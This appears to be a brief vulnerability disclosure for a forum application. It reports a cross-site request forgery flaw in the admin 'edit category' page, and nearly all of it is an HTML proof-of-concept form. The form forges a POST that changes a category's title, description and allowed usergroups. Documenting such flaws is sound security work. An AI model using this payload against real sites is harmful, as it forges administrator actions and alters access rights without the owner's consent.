# Edit Category CSRF
Allows for the forum categories to be edited through CSRF.

## PoC:
```html
<link rel="stylesheet" href="http://localhost/public/admin/bower_components/bootstrap/dist/css/bootstrap.min.css">

<form action="http://localhost/admin/edit_category.php/id/1" method="POST" style="padding: 25px;">
    <label for="cat_title">Title</label>
    <input type="text" name="cat_title" id="cat_title" value="First Category" class="form-control">
    <label for="cat_desc">Description</label>
    <textarea name="cat_desc" id="cat_desc" class="form-control">First category on this forum!</textarea>
    <br>
    <label for="allowed_usergroups">Allowed Usergroups</label><br>
    <input type="checkbox" name="allowed_ug[]" value="0" checked=""> Guest<br><input type="checkbox" name="allowed_ug[]" value="1" checked=""> User<br><input type="checkbox" name="allowed_ug[]" value="2"> Banned<br><input type="checkbox" name="allowed_ug[]" value="3" checked=""> Moderator<br><input type="checkbox" name="allowed_ug[]" value="4" checked=""> Administrator<br>
    <br>
    <input type="submit" name="update" value="Save Changes" class="btn btn-default">
</form>
```
